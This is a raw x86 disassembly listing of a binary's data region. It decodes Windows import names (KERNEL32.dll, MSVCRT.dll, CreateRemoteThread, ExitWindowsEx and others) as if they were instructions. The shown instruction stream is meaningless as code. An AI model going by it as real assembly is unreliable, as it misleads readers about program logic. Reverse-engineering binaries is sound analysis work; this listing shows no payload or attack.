  428415:	arpl   WORD PTR [eax+0x74],si
  428418:	inc    esi
  428419:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  428421:	pop    edi
  428422:	gs js  0x42848e
  428425:	je     0x428427
  428427:	in     eax,0x3
  428429:	jae    0x42849f
  42842b:	jb     0x428490
  42842d:	push   0xf2000072
  428432:	add    esi,DWORD PTR [ebx+0x74]
  428435:	jb     0x4284a5
  428437:	arpl   WORD PTR [eax+0x79],si
  42843a:	add    al,ch
  42843c:	add    BYTE PTR [edi+0x63],bl
  42843f:	gs js  0x4284ab
  428442:	je     0x428444
  428444:	add    BYTE PTR [ebp+0x3],ch
  428447:	data16 addr16 gs je 0x4284af
  42844c:	add    BYTE PTR ds:0x73637704,ch
  428452:	jb     0x4284b7
  428454:	push   0x4200072
  428459:	ja     0x4284be
  42845b:	jae    0x4284c0
  42845d:	outs   dx,DWORD PTR ds:[esi]
  42845e:	ins    BYTE PTR es:[edi],dx
  42845f:	ins    BYTE PTR es:[edi],dx
  428460:	add    cl,ah
  428462:	add    esi,DWORD PTR [ebx+0x73]
  428465:	arpl   WORD PTR [ecx+0x6e],sp
  428468:	data16 add BYTE PTR [eax],al
  42846b:	mov    ch,0x0
  42846d:	pop    edi
  42846e:	pop    edi
  42846f:	jae    0x4284d6
  428471:	je     0x4284e8
  428473:	jae    0x4284da
  428475:	jb     0x4284e4
  428477:	popa   
  428478:	je     0x4284e2
  42847a:	gs jb  0x4284ef
  42847d:	add    BYTE PTR [eax],al
  42847f:	mov    BYTE PTR [ebx],al
  428481:	data16 ja 0x4284f6
  428484:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7303f500
  42848c:	je     0x428500
  42848e:	jo     0x4284f2
  428490:	jb     0x4284fd
  428492:	add    ah,cl
  428494:	add    esi,DWORD PTR [ecx+0x73]
  428497:	outs   dx,DWORD PTR ds:[esi]
  428498:	jb     0x42850e
  42849a:	add    BYTE PTR [edx+0x0],dh
  42849d:	pop    edi
  42849e:	pop    edi
  42849f:	addr16 gs je 0x428510
  4284a3:	popa   
  4284a4:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  4284ab:	cli    
  4284ac:	add    esi,DWORD PTR [ebx+0x74]
  4284af:	jb     0x428525
  4284b1:	outs   dx,DWORD PTR ds:[esi]
  4284b2:	imul   eax,DWORD PTR [eax],0x0
  4284b5:	dec    ebp
  4284b6:	push   ebx
  4284b7:	push   esi
  4284b8:	inc    ebx
  4284b9:	push   edx
  4284ba:	push   esp
  4284bb:	cs fs ins BYTE PTR es:[edi],dx
  4284be:	ins    BYTE PTR es:[edi],dx
  4284bf:	add    BYTE PTR [eax],al
  4284c1:	je     0x4284c5
  4284c3:	inc    edi
  4284c4:	gs je  0x42851c
  4284c7:	jae    0x42852e
  4284c9:	jb     0x42850f
  4284cb:	gs popaw 
  4284ce:	jne    0x42853c
  4284d0:	je     0x42851e
  4284d2:	popa   
  4284d3:	outs   dx,BYTE PTR ds:[esi]
  4284d4:	addr16 dec ecx
  4284d6:	inc    esp
  4284d7:	add    BYTE PTR [eax],al
  4284d9:	jnp    0x4284dc
  4284db:	inc    esi
  4284dc:	outs   dx,DWORD PTR ds:[esi]
  4284dd:	ins    BYTE PTR es:[edi],dx
  4284de:	fs push ebx
  4284e0:	je     0x428554
  4284e2:	imul   ebp,DWORD PTR [esi+0x67],0x4280057
  4284e9:	push   ebx
  4284ea:	gs je  0x42853d
  4284ed:	jb     0x428558
  4284ef:	outs   dx,DWORD PTR ds:[esi]
  4284f0:	jb     0x42855b
  4284f2:	je     0x42856d
  4284f4:	inc    ebx
  4284f5:	ins    BYTE PTR es:[edi],dx
  4284f6:	popa   
  4284f7:	jae    0x42856c
  4284f9:	add    BYTE PTR [eax],al
  4284fb:	pop    ebp
  4284fc:	add    DWORD PTR [esi+0x69],eax
  4284ff:	outs   dx,BYTE PTR ds:[esi]
  428500:	fs inc esi
  428502:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  428509:	gs inc ecx
  42850b:	add    BYTE PTR [eax],al
  42850d:	or     al,BYTE PTR [ebx]
  42850f:	dec    esp
  428510:	outs   dx,DWORD PTR ds:[esi]
  428511:	popa   
  428512:	fs push edx
  428514:	gs jae 0x428586
  428517:	jne    0x42858b
  428519:	arpl   WORD PTR [ebp+0x0],sp
  42851c:	add    BYTE PTR ds:0x74655304,bl
  428522:	dec    eax
  428523:	popa   
  428524:	outs   dx,BYTE PTR ds:[esi]
  428525:	fs ins BYTE PTR es:[edi],dx
  428527:	gs inc ebx
  428529:	outs   dx,DWORD PTR ds:[esi]
  42852a:	jne    0x42859a
  42852c:	je     0x42852e
  42852e:	add    BYTE PTR [ecx+0x3],bl
  428531:	push   eax
  428532:	jne    0x4285a0
  428534:	jae    0x42859b
  428536:	inc    ebp
  428537:	jbe    0x42859e
  428539:	outs   dx,BYTE PTR ds:[esi]
  42853a:	je     0x42853c
  42853c:	add    BYTE PTR ds:0x74655304,dl
  428542:	inc    esi
  428543:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  42854b:	outs   dx,DWORD PTR ds:[esi]
  42854c:	dec    edi
  42854d:	inc    ebp
  42854e:	dec    ebp
  42854f:	add    BYTE PTR [eax],al
  428551:	mov    al,BYTE PTR [edx]
  428553:	inc    edi
  428554:	ins    BYTE PTR es:[edi],dx
  428555:	outs   dx,DWORD PTR ds:[esi]
  428556:	bound  esp,QWORD PTR [ecx+0x6c]
  428559:	inc    ebx
  42855a:	outs   dx,DWORD PTR ds:[esi]
  42855b:	ins    DWORD PTR es:[edi],dx
  42855c:	jo     0x4285bf
  42855e:	arpl   WORD PTR [eax+eax*1+0x9],si
  428562:	add    al,BYTE PTR [edi+0x65]
  428565:	je     0x4285b4
  428567:	outs   dx,DWORD PTR ds:[esi]
  428568:	fs jne 0x4285d7
  42856b:	gs inc esi
  42856d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  428575:	add    BYTE PTR [eax],al
  428577:	mov    eax,DWORD PTR [edx]
  428579:	inc    edi
  42857a:	ins    BYTE PTR es:[edi],dx
  42857b:	outs   dx,DWORD PTR ds:[esi]
  42857c:	bound  esp,QWORD PTR [ecx+0x6c]
  42857f:	inc    esp
  428580:	gs ins BYTE PTR es:[edi],dx
  428582:	gs je  0x4285ea
  428585:	inc    ecx
  428586:	je     0x4285f7
  428588:	ins    DWORD PTR es:[edi],dx
  428589:	add    BYTE PTR [eax],al
  42858b:	and    DWORD PTR [ebx+edx*2],eax
  42858e:	gs je  0x4285dd
  428591:	popa   
  428592:	jae    0x428608
  428594:	inc    ebp
  428595:	jb     0x428609
  428597:	outs   dx,DWORD PTR ds:[esi]
  428598:	jb     0x42859a
  42859a:	add    BYTE PTR [ebp+0x4],cl
  42859d:	push   ebx
  42859e:	ins    BYTE PTR es:[edi],dx
  42859f:	gs gs jo 0x4285a3
  4285a3:	inc    eax
  4285a4:	add    al,0x53
  4285a6:	gs je  0x4285fd
  4285a9:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4285b0:	jne    0x428617
  4285b2:	push   esp
  4285b3:	imul   ebp,DWORD PTR [ebp+0x65],0xf3000072
  4285ba:	add    al,0x56
  4285bc:	imul   esi,DWORD PTR [edx+0x74],0x556c6175
  4285c3:	outs   dx,BYTE PTR ds:[esi]
  4285c4:	ins    BYTE PTR es:[edi],dx
  4285c5:	outs   dx,DWORD PTR ds:[esi]
  4285c6:	arpl   WORD PTR [ebx+0x0],bp
  4285c9:	ret    
  4285ca:	add    al,0x6c
  4285cc:	jae    0x428642
  4285ce:	jb     0x428633
  4285d0:	ins    DWORD PTR es:[edi],dx
  4285d1:	jo     0x42862a
  4285d3:	add    BYTE PTR [eax],al
  4285d5:	dec    esp
  4285d6:	add    al,0x53
  4285d8:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  4285df:	jae    0x428650
  4285e1:	jne    0x428655
  4285e3:	arpl   WORD PTR [ebp+0x0],sp
  4285e6:	add    BYTE PTR [edx+0x74654701],cl
  4285ec:	inc    ecx
  4285ed:	inc    ebx
  4285ee:	push   eax
  4285ef:	add    BYTE PTR [eax],al
  4285f1:	jno    0x4285f5
  4285f3:	inc    edi
  4285f4:	gs je  0x42864b
  4285f7:	imul   ebp,DWORD PTR [ebp+0x65],0x656e6f5a
  4285fe:	dec    ecx
  4285ff:	outs   dx,BYTE PTR ds:[esi]
  428600:	outs   dx,WORD PTR ds:[esi]
  428602:	jb     0x428671
  428604:	popa   
  428605:	je     0x428670
  428607:	outs   dx,DWORD PTR ds:[esi]
  428608:	outs   dx,BYTE PTR ds:[esi]
  428609:	add    BYTE PTR [eax],al
  42860b:	jae    0x42860f
  42860d:	inc    edi
  42860e:	gs je  0x428666
  428611:	jae    0x428678
  428613:	jb     0x428659
  428615:	gs popaw 
  428618:	jne    0x428686
  42861a:	je     0x428668
  42861c:	inc    ebx
  42861d:	dec    ecx
  42861e:	inc    esp
  42861f:	add    BYTE PTR [eax],al
  428621:	mov    al,0x3
  428623:	push   edx
  428624:	gs ins BYTE PTR es:[edi],dx
  428626:	gs popa 
  428628:	jae    0x42868f
  42862a:	push   ebx
  42862b:	gs ins DWORD PTR es:[edi],dx
  42862d:	popa   
  42862e:	jo     0x428698
  428630:	outs   dx,DWORD PTR ds:[esi]
  428631:	jb     0x428698
  428633:	add    BYTE PTR [eax],al
  428635:	ins    DWORD PTR es:[edi],dx
  428636:	add    al,BYTE PTR [edi+0x65]
  428639:	je     0x42868f
  42863b:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  428642:	je     0x428644
  428644:	add    dh,al
  428646:	add    al,0x6c
  428648:	jae    0x4286be
  42864a:	jb     0x4286af
  42864c:	ins    DWORD PTR es:[edi],dx
  42864d:	jo     0x4286b8
  42864f:	push   edi
  428650:	add    bl,bl
  428652:	add    cl,BYTE PTR [ecx+0x73]
  428655:	push   esi
  428656:	popa   
  428657:	ins    BYTE PTR es:[edi],dx
  428658:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  428660:	add    dl,al
  428662:	add    al,0x6c
  428664:	jae    0x4286da
  428666:	jb     0x4286cb
  428668:	ins    DWORD PTR es:[edi],dx
  428669:	jo     0x4286ac
  42866b:	add    BYTE PTR [eax],al
  42866d:	in     al,0x3
  42866f:	push   ebx
  428670:	gs je  0x4286b6
  428673:	outs   dx,DWORD PTR ds:[esi]
  428674:	ins    DWORD PTR es:[edi],dx
  428675:	ins    DWORD PTR es:[edi],dx
  428676:	push   esp
  428677:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  42867e:	add    BYTE PTR [edx+0x65724601],al
  428684:	gs dec esp
  428686:	imul   esp,DWORD PTR [edx+0x72],0x797261
  42868d:	pop    DWORD PTR [edx]
  42868f:	inc    edi
  428690:	ins    BYTE PTR es:[edi],dx
  428691:	outs   dx,DWORD PTR ds:[esi]
  428692:	bound  esp,QWORD PTR [ecx+0x6c]
  428695:	inc    esi
  428696:	ins    BYTE PTR es:[edi],dx
  428697:	popa   
  428698:	addr16 jae 0x42869b
  42869b:	into   
  42869c:	add    al,0x6c
  42869e:	jae    0x428714
  4286a0:	jb     0x42870e
  4286a2:	outs   dx,BYTE PTR gs:[esi]
  4286a4:	inc    ecx
  4286a5:	add    BYTE PTR [eax],al
  4286a7:	sbb    BYTE PTR [ebx+edx*2],al
  4286aa:	gs je  0x4286f3
  4286ad:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4286b5:	gs jb  0x4286b8
  4286b8:	add    BYTE PTR [eax+0x2],ah
  4286bb:	inc    edi
  4286bc:	gs je  0x428713
  4286bf:	gs ins DWORD PTR es:[edi],dx
  4286c1:	jo     0x428709
  4286c3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  4286cb:	add    BYTE PTR [eax],al
  4286cd:	sub    eax,0x6e694601
  4286d2:	fs inc ecx
  4286d4:	je     0x428745
  4286d6:	ins    DWORD PTR es:[edi],dx
  4286d7:	push   edi
  4286d8:	add    dl,ch
  4286da:	add    BYTE PTR [ebx+0x72],al
  4286dd:	gs popa 
  4286df:	je     0x428746
  4286e1:	push   ebx
  4286e2:	gs ins DWORD PTR es:[edi],dx
  4286e4:	popa   
  4286e5:	jo     0x42874f
  4286e7:	outs   dx,DWORD PTR ds:[esi]
  4286e8:	jb     0x42874f
  4286ea:	push   edi
  4286eb:	add    BYTE PTR [eax],al
  4286ed:	fadd   QWORD PTR [ebx]
  4286ef:	push   ebx
  4286f0:	gs popa 
  4286f2:	jb     0x428757
  4286f4:	push   0x68746150
  4286f9:	push   edi
  4286fa:	add    BYTE PTR [ebx+eax*1+0x4f],al
  4286fe:	jo     0x428765
  428700:	outs   dx,BYTE PTR ds:[esi]
  428701:	push   ebx
  428702:	gs ins DWORD PTR es:[edi],dx
  428704:	popa   
  428705:	jo     0x42876f
  428707:	outs   dx,DWORD PTR ds:[esi]
  428708:	jb     0x42876f
  42870a:	push   edi
  42870b:	add    BYTE PTR [eax],al
  42870d:	into   
  42870e:	add    cl,BYTE PTR [ecx+0x73]
  428711:	inc    edx
  428712:	popa   
  428713:	fs push edi
  428715:	jb     0x428780
  428717:	je     0x42877e
  428719:	push   eax
  42871a:	je     0x42878e
  42871c:	add    cl,dh
  42871e:	add    DWORD PTR [edi+0x65],eax
  428721:	je     0x428769
  428723:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  42872b:	xchg   edx,eax
  42872c:	add    al,BYTE PTR [edi+0x6c]
  42872f:	outs   dx,DWORD PTR ds:[esi]
  428730:	bound  esp,QWORD PTR [ecx+0x6c]
  428733:	inc    edi
  428734:	gs je  0x428778
  428737:	je     0x4287a8
  428739:	ins    DWORD PTR es:[edi],dx
  42873a:	dec    esi
  42873b:	popa   
  42873c:	ins    DWORD PTR es:[edi],dx
  42873d:	gs push edi
  42873f:	add    BYTE PTR [eax],al
  428741:	mov    edi,0x74736c04
  428746:	jb     0x4287ab
  428748:	popa   
  428749:	je     0x42878c
  42874b:	add    BYTE PTR [eax],al
  42874d:	out    0x0,al
  42874f:	inc    ebx
  428750:	jb     0x4287b7
  428752:	popa   
  428753:	je     0x4287ba
  428755:	push   edx
  428756:	gs ins DWORD PTR es:[edi],dx
  428758:	outs   dx,DWORD PTR ds:[esi]
  428759:	je     0x4287c0
  42875b:	push   esp
  42875c:	push   0x64616572
  428761:	add    BYTE PTR [eax],al
  428763:	imul   eax,DWORD PTR [edx*2+0x6e61686e],0x64
  42876b:	ins    BYTE PTR es:[edi],dx
  42876c:	gs fs inc ebp
  42876f:	js     0x4287d4
  428771:	gs jo  0x4287e8
  428774:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  42877b:	gs jb  0x42877e
  42877e:	add    BYTE PTR [ebx+0x6d655203],dh
  428784:	outs   dx,DWORD PTR ds:[esi]
  428785:	jbe    0x4287ec
  428787:	inc    esp
  428788:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42878f:	jns    0x4287d2
  428791:	add    BYTE PTR [eax],al
  428793:	pop    edi
  428794:	add    al,BYTE PTR [edi+0x65]
  428797:	je     0x4287ed
  428799:	gs ins DWORD PTR es:[edi],dx
  42879b:	jo     0x4287e3
  42879d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4287a5:	add    BYTE PTR [eax],al
  4287a7:	out    0x0,eax
  4287a9:	inc    ebx
  4287aa:	jb     0x428811
  4287ac:	popa   
  4287ad:	je     0x428814
  4287af:	push   ebx
  4287b0:	gs ins DWORD PTR es:[edi],dx
  4287b2:	popa   
  4287b3:	jo     0x42881d
  4287b5:	outs   dx,DWORD PTR ds:[esi]
  4287b6:	jb     0x42881d
  4287b8:	inc    ecx
  4287b9:	add    BYTE PTR [eax],al
  4287bb:	in     al,dx
  4287bc:	add    DWORD PTR [edi+0x65],eax
  4287bf:	je     0x428807
  4287c1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4287c9:	bound  esi,QWORD PTR [ebp+0x74]
  4287cc:	gs jae 0x428826
  4287cf:	add    BYTE PTR [eax],al
  4287d1:	jmp    0x6946:0x74654701
  4287d8:	ins    BYTE PTR es:[edi],dx
  4287d9:	gs inc ecx
  4287db:	je     0x428851
  4287dd:	jb     0x428848
  4287df:	bound  esi,QWORD PTR [ebp+0x74]
  4287e2:	gs jae 0x42882a
  4287e5:	js     0x428828
  4287e7:	add    BYTE PTR [eax],al
  4287e9:	nop
  4287ea:	add    al,BYTE PTR [edi+0x6c]
  4287ed:	outs   dx,DWORD PTR ds:[esi]
  4287ee:	bound  esp,QWORD PTR [ecx+0x6c]
  4287f1:	inc    esi
  4287f2:	jb     0x428859
  4287f4:	add    BYTE PTR gs:[eax],al
  4287f7:	inc    ebp
  4287f8:	add    al,BYTE PTR [edi+0x65]
  4287fb:	je     0x428850
  4287fd:	je     0x428860
  4287ff:	jb     0x428875
  428801:	jne    0x428873
  428803:	dec    ecx
  428804:	outs   dx,BYTE PTR ds:[esi]
  428805:	outs   dx,WORD PTR ds:[esi]
  428807:	push   edi
  428808:	add    BYTE PTR [ecx+0x6f6c4702],dl
  42880e:	bound  esp,QWORD PTR [ecx+0x6c]
  428811:	inc    edi
  428812:	gs je  0x428856
  428815:	je     0x428886
  428817:	ins    DWORD PTR es:[edi],dx
  428818:	dec    esi
  428819:	popa   
  42881a:	ins    DWORD PTR es:[edi],dx
  42881b:	gs inc ecx
  42881d:	add    BYTE PTR [eax],al
  42881f:	mov    ds:0x6c614300,al
  428824:	ins    BYTE PTR es:[edi],dx
  428825:	dec    esi
  428826:	popa   
  428827:	ins    DWORD PTR es:[edi],dx
  428828:	gs fs push eax
  42882b:	imul   esi,DWORD PTR [eax+0x65],0xf3000057
  428832:	add    DWORD PTR [edi+0x65],eax
  428835:	je     0x42887d
  428837:	jne    0x4288a5
  428839:	ins    BYTE PTR es:[edi],dx
  42883a:	push   eax
  42883b:	popa   
  42883c:	je     0x4288a6
  42883e:	dec    esi
  42883f:	popa   
  428840:	ins    DWORD PTR es:[edi],dx
  428841:	gs push edi
  428843:	add    BYTE PTR [eax],al
  428845:	xchg   DWORD PTR [edx],eax
  428847:	inc    edi
  428848:	ins    BYTE PTR es:[edi],dx
  428849:	outs   dx,DWORD PTR ds:[esi]
  42884a:	bound  esp,QWORD PTR [ecx+0x6c]
  42884d:	inc    ecx
  42884e:	fs fs inc ecx
  428851:	je     0x4288c2
  428853:	ins    DWORD PTR es:[edi],dx
  428854:	inc    ecx
  428855:	add    BYTE PTR [eax],al
  428857:	dec    ebx
  428858:	inc    ebp
  428859:	push   edx
  42885a:	dec    esi
  42885b:	inc    ebp
  42885c:	dec    esp
  42885d:	xor    esi,DWORD PTR [edx]
  42885f:	cs fs ins BYTE PTR es:[edi],dx
  428862:	ins    BYTE PTR es:[edi],dx
  428863:	add    BYTE PTR [eax],al
  428865:	sahf   
  428866:	add    DWORD PTR [ecx+0x73],ecx
  428869:	push   edx
  42886a:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  42886f:	jo     0x4288e5
  428871:	jns    0x428873
  428873:	mov    DWORD PTR [ecx],eax
  428875:	dec    ecx
  428876:	outs   dx,BYTE PTR ds:[esi]
  428877:	jbe    0x4288da
  428879:	ins    BYTE PTR es:[edi],dx
  42887a:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  428882:	je     0x428884
  428884:	add    ch,dh
  428886:	add    BYTE PTR [edi+0x65],al
  428889:	je     0x4288ce
  42888b:	ins    BYTE PTR es:[edi],dx
  42888c:	popa   
  42888d:	jae    0x428902
  42888f:	dec    ecx
  428890:	outs   dx,BYTE PTR ds:[esi]
  428891:	outs   dx,WORD PTR ds:[esi]
  428893:	inc    ebp
  428894:	js     0x4288d7
  428896:	add    al,ah
  428898:	add    BYTE PTR [esi+0x69],al
  42889b:	ins    BYTE PTR es:[edi],dx
  42889c:	ins    BYTE PTR es:[edi],dx
  42889d:	push   edx
  42889e:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4288a3:	jl     0x4288a7
  4288a5:	push   ebx
  4288a6:	push   0x774f776f
  4288ab:	outs   dx,BYTE PTR ds:[esi]
  4288ac:	gs fs push eax
  4288af:	outs   dx,DWORD PTR ds:[esi]
  4288b0:	jo     0x428927
  4288b2:	jo     0x428927
  4288b4:	add    ch,al
  4288b6:	add    DWORD PTR [ebp+0x61],ecx
  4288b9:	jo     0x428911
  4288bb:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  4288c2:	gs jns 0x428906
  4288c5:	add    BYTE PTR [eax],al
  4288c7:	test   al,0x1
  4288c9:	dec    esp
  4288ca:	outs   dx,DWORD PTR ds:[esi]
  4288cb:	popa   
  4288cc:	fs inc ecx
  4288ce:	arpl   WORD PTR [ebx+0x65],sp
  4288d1:	ins    BYTE PTR es:[edi],dx
  4288d2:	gs jb  0x428936
  4288d5:	je     0x428946
  4288d7:	jb     0x42894c
  4288d9:	push   edi
  4288da:	add    BYTE PTR [edi+0x616f4c01],ch
  4288e0:	fs dec ecx
  4288e2:	arpl   WORD PTR [edi+0x6e],bp
  4288e5:	inc    ecx
  4288e6:	add    BYTE PTR [eax+0x1],bl
  4288e9:	inc    edi
  4288ea:	gs je  0x428940
  4288ed:	jne    0x428951
  4288ef:	dec    ebp
  4288f0:	outs   dx,BYTE PTR gs:[esi]
  4288f2:	jne    0x4288f4
  4288f4:	add    bl,al
  4288f6:	add    BYTE PTR [ebp+0x6e],al
  4288f9:	fs inc esp
  4288fb:	imul   esp,DWORD PTR [ecx+0x6c],0x3300676f
  428902:	add    BYTE PTR [ebx+0x68],al
  428905:	popa   
  428906:	jb     0x42895c
  428908:	outs   dx,DWORD PTR ds:[esi]
  428909:	dec    edi
  42890a:	gs ins DWORD PTR es:[edi],dx
  42890c:	inc    edx
  42890d:	jne    0x428975
  42890f:	inc    cx
  428911:	add    BYTE PTR [eax],al
  428913:	pop    ecx
  428914:	add    DWORD PTR [edi+0x65],eax
  428917:	je     0x42896c
  428919:	jns    0x42898e
  42891b:	inc    ebx
  42891c:	outs   dx,DWORD PTR ds:[esi]
  42891d:	ins    BYTE PTR es:[edi],dx
  42891e:	outs   dx,DWORD PTR ds:[esi]
  42891f:	jb     0x428921
  428921:	mov    es,WORD PTR [edx]
  428923:	push   esp
  428924:	outs   dx,DWORD PTR ds:[esi]
  428925:	push   ebp
  428926:	outs   dx,BYTE PTR ds:[esi]
  428927:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  42892e:	add    BYTE PTR ds:0x6c6c4100,al
  428934:	outs   dx,DWORD PTR ds:[esi]
  428935:	ja     0x42898a
  428937:	gs je  0x428980
  42893a:	outs   dx,DWORD PTR ds:[esi]
  42893b:	jb     0x4289a2
  42893d:	addr16 jb 0x4289af
  428940:	jne    0x4289b0
  428942:	fs push edi
  428944:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  42894b:	mov    BYTE PTR [ecx],al
  42894d:	dec    ecx
  42894e:	outs   dx,BYTE PTR ds:[esi]
  42894f:	je     0x4289b6
  428951:	jb     0x4289c6
  428953:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  428958:	arpl   WORD PTR [eax+eax*1+0x1],si
  42895c:	add    BYTE PTR [ecx+0x63],al
  42895f:	je     0x4289ca
  428961:	jbe    0x4289c4
  428963:	je     0x4289ca
  428965:	dec    ebx
  428966:	gs jns 0x4289cb
  428969:	outs   dx,DWORD PTR ds:[esi]
  42896a:	popa   
  42896b:	jb     0x4289d1
  42896d:	dec    esp
  42896e:	popa   
  42896f:	jns    0x4289e0
  428971:	jne    0x4289e7
  428973:	add    BYTE PTR [eax],al
  428975:	out    dx,al
  428976:	add    DWORD PTR [eax+0x65],edx
  428979:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  42897e:	jae    0x4289e1
  428980:	addr16 gs inc ecx
  428983:	add    BYTE PTR [eax],al
  428985:	add    eax,DWORD PTR [eax]
  428987:	inc    ecx
  428988:	fs push 0x75
  42898b:	jae    0x428a01
  42898d:	push   edi
  42898e:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428995:	arpl   WORD PTR [ebp+eax*2+0x78],si
  428999:	add    BYTE PTR [eax],al
  42899b:	cmp    al,0x1
  42899d:	inc    edi
  42899e:	gs je  0x4289ee
  4289a1:	gs jae 0x428a17
  4289a4:	popa   
  4289a5:	addr16 gs push eax
  4289a8:	outs   dx,DWORD PTR ds:[esi]
  4289a9:	jae    0x4289ab
  4289ab:	push   ecx
  4289ac:	add    dl,BYTE PTR [ebx+0x65]
  4289af:	je     0x428a01
  4289b1:	popa   
  4289b2:	jb     0x428a19
  4289b4:	outs   dx,BYTE PTR ds:[esi]
  4289b5:	je     0x4289b7
  4289b7:	lahf   
  4289b8:	add    BYTE PTR [ecx+ebp*2+0x73],al
  4289bc:	jo     0x428a1f
  4289be:	je     0x428a23
  4289c0:	push   0x7373654d
  4289c5:	popa   
  4289c6:	addr16 gs inc ecx
  4289c9:	add    BYTE PTR [eax],al
  4289cb:	fwait
  4289cc:	add    dl,BYTE PTR [ebp+0x6e]
  4289cf:	ins    BYTE PTR es:[edi],dx
  4289d0:	outs   dx,DWORD PTR ds:[esi]
  4289d1:	popa   
  4289d2:	fs dec ebx
  4289d4:	gs jns 0x428a39
  4289d7:	outs   dx,DWORD PTR ds:[esi]
  4289d8:	popa   
  4289d9:	jb     0x428a3f
  4289db:	dec    esp
  4289dc:	popa   
  4289dd:	jns    0x428a4e
  4289df:	jne    0x428a55
  4289e1:	add    BYTE PTR [eax],al
  4289e3:	out    0x0,eax
  4289e5:	inc    esi
  4289e6:	jb     0x428a49
  4289e8:	ins    DWORD PTR es:[edi],dx
  4289e9:	gs push edx
  4289eb:	arpl   WORD PTR gs:[eax+eax*1-0x21],si
  4289f0:	add    BYTE PTR [ebp+0x78],al
  4289f3:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4289fb:	jae    0x428a42
  4289fd:	js     0x4289ff
  4289ff:	rol    BYTE PTR [edx],0x77
  428a02:	jae    0x428a74
  428a04:	jb     0x428a6f
  428a06:	outs   dx,BYTE PTR ds:[esi]
  428a07:	je     0x428a6f
  428a09:	push   edi
  428a0a:	add    BYTE PTR [eax],bh
  428a0c:	add    dl,BYTE PTR [ebx+0x65]
  428a0f:	je     0x428a54
  428a11:	jne    0x428a85
  428a13:	jae    0x428a84
  428a15:	jb     0x428a17
  428a17:	sub    eax,DWORD PTR [eax]
  428a19:	inc    ebx
  428a1a:	push   0x654e7261
  428a1f:	js     0x428a95
  428a21:	inc    ebp
  428a22:	js     0x428a65
  428a24:	add    BYTE PTR [eax+0x2],bl
  428a27:	push   ebx
  428a28:	gs je  0x428a7d
  428a2b:	arpl   WORD PTR gs:[eax+eax*1+0x55],si
  428a30:	add    DWORD PTR [edi+0x65],eax
  428a33:	je     0x428a88
  428a35:	arpl   WORD PTR [edx+0x6f],si
  428a38:	ins    BYTE PTR es:[edi],dx
  428a39:	ins    BYTE PTR es:[edi],dx
  428a3a:	push   eax
  428a3b:	outs   dx,DWORD PTR ds:[esi]
  428a3c:	jae    0x428a3e
  428a3e:	add    BYTE PTR [edx+eax*1],bl
  428a41:	push   ebx
  428a42:	arpl   WORD PTR [edx+0x65],si
  428a45:	outs   dx,BYTE PTR gs:[esi]
  428a47:	push   esp
  428a48:	outs   dx,DWORD PTR ds:[esi]
  428a49:	inc    ebx
  428a4a:	ins    BYTE PTR es:[edi],dx
  428a4b:	imul   esp,DWORD PTR [ebp+0x6e],0xb9000074
  428a52:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428a56:	fs dec ebp
  428a58:	outs   dx,BYTE PTR gs:[esi]
  428a5a:	jne    0x428ab3
  428a5c:	add    BYTE PTR [eax+0x1],al
  428a5f:	inc    edi
  428a60:	gs je  0x428ab0
  428a63:	outs   dx,DWORD PTR ds:[esi]
  428a64:	outs   dx,BYTE PTR ds:[esi]
  428a65:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  428a6d:	push   edi
  428a6e:	add    BYTE PTR [eax+0x1],ch
  428a71:	inc    edi
  428a72:	gs je  0x428acc
  428a75:	imul   ebp,DWORD PTR [esi+0x64],0x4100776f
  428a7c:	add    dl,BYTE PTR [ebx+0x65]
  428a7f:	je     0x428ac7
  428a81:	outs   dx,DWORD PTR ds:[esi]
  428a82:	arpl   WORD PTR [ebp+0x73],si
  428a85:	add    BYTE PTR [eax],al
  428a87:	bound  eax,QWORD PTR [ecx]
  428a89:	inc    edi
  428a8a:	gs je  0x428ae1
  428a8d:	outs   dx,DWORD PTR ds:[esi]
  428a8e:	jo     0x428ae7
  428a90:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428a97:	and    DWORD PTR [edx],eax
  428a99:	push   ebx
  428a9a:	outs   dx,BYTE PTR gs:[esi]
  428a9c:	fs inc esp
  428a9e:	ins    BYTE PTR es:[edi],dx
  428a9f:	addr16 dec ecx
  428aa1:	je     0x428b08
  428aa3:	ins    DWORD PTR es:[edi],dx
  428aa4:	dec    ebp
  428aa5:	gs jae 0x428b1b
  428aa8:	popa   
  428aa9:	addr16 gs inc ecx
  428aac:	add    BYTE PTR [eax+eax*1+0x43],al
  428ab0:	ins    BYTE PTR es:[edi],dx
  428ab1:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  428ab8:	jb     0x428aba
  428aba:	add    BYTE PTR [esi+0x1],dl
  428abd:	inc    edi
  428abe:	gs je  0x428b14
  428ac1:	arpl   WORD PTR [edx+0x6f],si
  428ac4:	ins    BYTE PTR es:[edi],dx
